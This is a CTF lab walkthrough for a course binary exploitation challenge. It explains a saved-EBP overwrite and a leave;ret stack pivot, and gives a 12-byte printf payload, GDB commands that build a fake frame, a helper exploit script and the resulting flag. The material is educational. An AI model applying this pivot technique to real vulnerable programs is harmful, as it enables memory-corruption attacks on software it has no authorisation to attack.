# Frame Pointer Walkthrough (Learn It By Hand)

This challenge is a frame-pointer pivot, not a format string.

## Fast Exam Read

If the code looks like this pattern:

- an 8-byte local buffer
- a 12-byte read
- a leak of one code address and one stack buffer address
- a `leave; ret` epilogue above the vulnerable function

then the win condition is a saved-EBP overwrite, not a direct return-address overwrite.

The helper script is ready to use as-is:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
./exploit.py
```

If the binary name changes in the exam, point the script at it:

```bash
./exploit.py --binary ./challenge
```

## Core idea

- `buf` is 8 bytes, but `read(0, buf, 12)` writes 12 bytes.
- So you overwrite saved EBP of `vuln()` (not the return address yet).
- Then `caller()` executes `leave; ret`, and uses your fake stack frame from `buf`.
- You place `jump()` as the return target in that fake frame.

Payload layout (12 bytes):

- bytes `0..3`: fake EBP (anything, e.g. `0x41414141`)
- bytes `4..7`: address of `jump()`
- bytes `8..11`: leaked `buf` address (overwrites saved EBP in `vuln`)

## Method 1: True manual terminal method

Use this if you want to do it by hand with no exploit script logic.

1. Disable ASLR for this command (so leaked `buf` is stable):

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
setarch i386 -R ./challenge
```

1. Note both printed addresses:

- `jump() @ 0x08049196`
- `buf @ 0xffffc8bc`  (example)

1. Convert to little-endian bytes:

- `jump`: `0x08049196` -> `\x96\x91\x04\x08`
- `buf`: `0xffffc8bc` -> `\xbc\xc8\xff\xff`

1. Send payload manually:

```bash
printf '\x41\x41\x41\x41\x96\x91\x04\x08\xbc\xc8\xff\xff' | setarch i386 -R ./challenge
```

1. Expected success:

```text
cosc466-flag-{fr4m3}
```

## Method 2: GDB learning method (best for understanding)

This method shows exactly what gets overwritten.

1. Start GDB:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
gdb -q ./challenge
```

1. Break right after `read` in `vuln` and run:

```gdb
b *vuln+36
run < /dev/null
```

1. Build the fake frame directly in memory:

```gdb
set $buf = $ebp-8
set {int}($buf)   = 0x41414141
set {int}($buf+4) = (int)jump
set {int}$ebp     = $buf
x/4wx $buf
```

You should see values like:

- `$buf[0] = 0x41414141`
- `$buf[1] = jump address`
- saved EBP now equals `$buf`

1. Continue:

gdb c

1. Expected output:

```text
cosc466-flag-{fr4m3}
```

## Optional Script Method

If you only need a fast solve:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
./exploit.py
```

The script prints the leaked addresses, the computed payload layout, and then
feeds the 12-byte pivot through a PTY so it behaves the same in a terminal or
an exam runner.

## One-line takeaway

You cannot reach `vuln`'s return address with only 12 bytes, so you overwrite `vuln`'s saved EBP and let `caller`'s `leave; ret` pivot into your fake frame in `buf`, then return to `jump()`.

## Exam Reminder

If the labels change but the structure stays the same, keep the same plan:

1. find one code address to jump to
1. find one stack address for the buffer
1. send `[fake_EBP][target][buffer]`
1. let the caller epilogue do the pivot for you
